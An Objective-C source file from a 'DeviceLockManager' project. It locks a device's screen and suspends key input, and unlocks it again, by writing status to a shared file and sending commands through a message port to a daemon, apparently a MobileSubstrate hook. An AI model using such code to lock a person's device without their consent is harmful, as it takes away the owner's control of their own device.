/** 
 - Project name: DeviceLockManager
 - Class name: DeviceLockUtils
 - Version: 1.0
 - Purpose: 
 - Copy right: 20/06/12, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

#import "DeviceLockUtils.h"
#import "MessagePortIPCSender.h"
#import "SharedFileIPC.h"
#import "AlertLockStatus.h"


@interface DeviceLockUtils (private) 
- (NSData *) constructCommandData: (AlertCommand) anAlertCmd;
- (void)	shareData: (NSInteger) aSharedID data: (NSData *) aData;
- (BOOL)	sendData: (NSData *) aData toPort: (NSString *) aPortName;
- (BOOL)	sendData: (NSData *) aData;
@end


@implementation DeviceLockUtils

/**
 - Method name	: lockScreenAndSuspendKeys 
 - Purpose		: 1) save lock status and lock message to DB
				  2) send unlock command to MS						
 - Arg(s)		:
 - Return		:
 */
- (void) lockScreenAndSuspendKeys: (NSString *) aMessage {
	// -- save data to database
	DLog(@"saving to DB ...")
	//NSString *message = @"!! you're locked";
	
	AlertLockStatus *alertLockStatus = [[AlertLockStatus alloc] initWithLockStatus:YES
															  deviceLockMessage:aMessage];
	
	NSBundle *bundle = [NSBundle mainBundle];
	[alertLockStatus setMBundleName:[[bundle infoDictionary] objectForKey:@"CFBundleName"]];
	[alertLockStatus setMBundleIdentifier:[bundle bundleIdentifier]];
	
	NSData *dataSavedToDB = [alertLockStatus toData];
	[alertLockStatus release];
	alertLockStatus = nil;
	
	[self shareData:kSharedFileAlertLockID data:dataSavedToDB];	

	DLog(@"sending to daemon ...")
	// -- send command to MS
	NSData *dataSentToMS = [self constructCommandData:kAlertLock];
	[self sendData:dataSentToMS];
	
}

/**
 - Method name	: unlockScreenAndResumeKeys 
 - Purpose		: 1) save unlock status and unlock message to DB
				  2) send unlock command to MS						
 - Arg(s)		:
 - Return		:
 */
- (void) unlockScreenAndResumeKeys {
	// -- save data to database
	NSString *message = @"++ you're unlocked";
	AlertLockStatus *alertLockStatus = [[AlertLockStatus alloc] initWithLockStatus:NO
																 deviceLockMessage:message];
	NSData *dataSavedToDB = [alertLockStatus toData];
	[alertLockStatus release];
	alertLockStatus = nil;
	
	[self shareData:kSharedFileAlertLockID data:dataSavedToDB];	
	
	// -- send command to MS
	NSData *dataSentToMS = [self constructCommandData:kAlertUnlock];
	[self sendData:dataSentToMS];
}

- (NSData *) constructCommandData: (AlertCommand) anAlertCmd {
	/*
		Format of the constrcted data
		| ALERT_COMMAND (NSInteger) |
	 */
	NSMutableData* data = [[NSMutableData alloc] init];
	[data appendBytes:&anAlertCmd length:sizeof(NSInteger)];	// Append AlertCommand
	return [data autorelease];
}

- (void) shareData: (NSInteger) aSharedID data: (NSData *) aData {
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
	[sFile writeData:aData withID:aSharedID];
	[sFile release];
}

- (BOOL) sendData: (NSData *) aData {
	BOOL success = NO;
	if (!(success = [self sendData:aData toPort:kAlertMessagePort])) {
		DLog(@"!!!!!!!!!!!!!!!!!!!! send event to the daemon")
	}
	return success;
}

- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName {
	BOOL success = NO;
	mMessagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	success = [mMessagePortSender writeDataToPort:aData];
	[mMessagePortSender release];
	mMessagePortSender = nil;
	return success;
}

// this method will be in MS
//- (void) transferDataToVariables: (NSData *) aData {
//	/*
//	 Format of the constrcted data
//	 | ALERT_COMMAND (NSInteger) | SIZE_OF_A_CONTENT_STRING | A_CONTENT_STRING |
//	 */	
//	AlertCommand alertCommand;
//	[aData getBytes:&alertCommand length:sizeof(NSInteger)];
//	
//	NSInteger sizeOfContentString = 0;
//	NSRange range = NSMakeRange(sizeof(NSInteger), sizeof(NSInteger));	
//	[aData getBytes:&sizeOfContentString range:range];
//	
//	range = NSMakeRange(sizeof(NSInteger) + sizeof(NSInteger), sizeOfContentString);	
//	NSData *contentStringData = [aData subdataWithRange:range];		
//	NSString *contentString = [[NSString alloc] initWithData:contentStringData 
//													encoding:NSUTF8StringEncoding];
//
//	DLog (@"AlertCommand %d", alertCommand)
//	DLog (@"content string %@", contentString)
//}

@end
